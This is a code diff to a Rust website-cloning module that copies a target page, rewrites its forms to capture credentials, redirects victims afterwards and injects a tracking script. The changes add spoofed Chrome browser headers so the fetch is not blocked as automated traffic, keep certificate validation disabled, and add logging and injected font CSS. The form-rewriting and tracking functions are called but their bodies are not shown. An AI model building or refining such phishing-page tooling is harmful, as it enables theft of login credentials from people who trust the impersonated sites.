@@ -22,8 +22,25 @@ impl Default for WebsiteCloner {
 
 impl WebsiteCloner {
     pub fn new() -> Self {
+        use reqwest::header::{HeaderMap, HeaderValue, ACCEPT, ACCEPT_LANGUAGE, ACCEPT_ENCODING, CACHE_CONTROL};
+
+        let mut headers = HeaderMap::new();
+        headers.insert(ACCEPT, HeaderValue::from_static("text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"));
+        headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static("en-US,en;q=0.9"));
+        headers.insert(ACCEPT_ENCODING, HeaderValue::from_static("gzip, deflate, br"));
+        headers.insert(CACHE_CONTROL, HeaderValue::from_static("no-cache"));
+        headers.insert("Sec-Fetch-Dest", HeaderValue::from_static("document"));
+        headers.insert("Sec-Fetch-Mode", HeaderValue::from_static("navigate"));
+        headers.insert("Sec-Fetch-Site", HeaderValue::from_static("none"));
+        headers.insert("Sec-Fetch-User", HeaderValue::from_static("?1"));
+        headers.insert("Sec-CH-UA", HeaderValue::from_static("\"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\", \"Not-A.Brand\";v=\"99\""));
+        headers.insert("Sec-CH-UA-Mobile", HeaderValue::from_static("?0"));
+        headers.insert("Sec-CH-UA-Platform", HeaderValue::from_static("\"Windows\""));
+        headers.insert("Upgrade-Insecure-Requests", HeaderValue::from_static("1"));
+
         let client = Client::builder()
             .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+            .default_headers(headers)
             .timeout(std::time::Duration::from_secs(30))
             .danger_accept_invalid_certs(true)
             .build()
@@ -40,6 +57,8 @@ impl WebsiteCloner {
         capture_fields: &[String],
         redirect_url: Option<&str>,
     ) -> Result<ClonedPage> {
+        log::info!("Cloning website: {}", url);
+
         let base_url = Url::parse(url).map_err(|e| anyhow!("Invalid URL: {}", e))?;
 
         // Fetch the page
@@ -48,16 +67,23 @@ impl WebsiteCloner {
             .get(url)
             .send()
             .await
-            .map_err(|e| anyhow!("Failed to fetch page: {}", e))?;
+            .map_err(|e| {
+                log::error!("Failed to fetch page {}: {}", url, e);
+                anyhow!("Failed to fetch page: {}. The website may be blocking automated requests or is unreachable.", e)
+            })?;
 
-        if !response.status().is_success() {
-            return Err(anyhow!("Failed to fetch page: HTTP {}", response.status()));
+        let status = response.status();
+        if !status.is_success() {
+            log::error!("HTTP error fetching {}: {}", url, status);
+            return Err(anyhow!("Failed to fetch page: HTTP {} - The website may require authentication or is blocking automated requests.", status));
         }
 
         let html = response
             .text()
             .await
             .map_err(|e| anyhow!("Failed to read response: {}", e))?;
+
+        log::info!("Successfully fetched {} bytes from {}", html.len(), url);
 
         // Parse and modify the HTML
         let modified_html = self.process_html(
@@ -67,6 +93,8 @@ impl WebsiteCloner {
             capture_fields,
             redirect_url,
         ).await?;
+
+        log::info!("Website clone completed: {} -> {} bytes", html.len(), modified_html.len());
 
         Ok(ClonedPage {
             original_url: url.to_string(),
@@ -89,9 +117,18 @@ impl WebsiteCloner {
 
         // Make relative URLs absolute
         modified_html = self.absolutize_urls(&modified_html, base_url);
+        log::debug!("Absolutized URLs in HTML");
 
-        // Inline external CSS
-        modified_html = self.inline_css(&document, base_url, &modified_html).await?;
+        // Inline external CSS (non-fatal on failure)
+        match self.inline_css(&document, base_url, &modified_html).await {
+            Ok(with_css) => {
+                modified_html = with_css;
+                log::debug!("Inlined external CSS");
+            }
+            Err(e) => {
+                log::warn!("Failed to inline CSS (continuing without): {}", e);
+            }
+        }
 
         // Inline external JS (optional - may break functionality)
         // modified_html = self.inline_js(&document, base_url, &modified_html).await?;
@@ -99,10 +136,16 @@ impl WebsiteCloner {
         // If capturing credentials, modify forms
         if capture_credentials {
             modified_html = self.modify_forms(&modified_html, capture_fields, redirect_url)?;
+            log::debug!("Modified forms for credential capture");
         }
+
+        // Add fallback fonts for better readability
+        modified_html = self.add_fallback_fonts(&modified_html);
+        log::debug!("Added fallback fonts");
 
         // Add tracking script
         modified_html = self.add_tracking_script(&modified_html);
+        log::debug!("Added tracking script");
 
         Ok(modified_html)
     }
@@ -221,6 +264,46 @@ impl WebsiteCloner {
         }
 
         Ok(modified)
+    }
+
+    /// Add fallback fonts to ensure text is always readable
+    fn add_fallback_fonts(&self, html: &str) -> String {
+        // CSS to ensure fonts are readable even if custom fonts don't load
+        let font_fix = r#"
+<style>
+/* Fallback fonts for cloned pages */
+* {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif !important;
+}
+input, textarea, select, button {
+    font-family: inherit !important;
+}
+/* Ensure text is visible */
+body, html {
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+}
+</style>
+"#;
+        // Insert after <head> tag
+        if let Some(pos) = html.to_lowercase().find("<head>") {
+            let insert_pos = pos + 6; // After "<head>"
+            let mut result = html.to_string();
+            result.insert_str(insert_pos, font_fix);
+            result
+        } else if let Some(pos) = html.to_lowercase().find("<head ") {
+            // Handle <head with attributes
+            if let Some(end) = html[pos..].find('>') {
+                let insert_pos = pos + end + 1;
+                let mut result = html.to_string();
+                result.insert_str(insert_pos, font_fix);
+                result
+            } else {
+                html.to_string()
+            }
+        } else {
+            html.to_string()
+        }
     }
 
     /// Add tracking script to the page
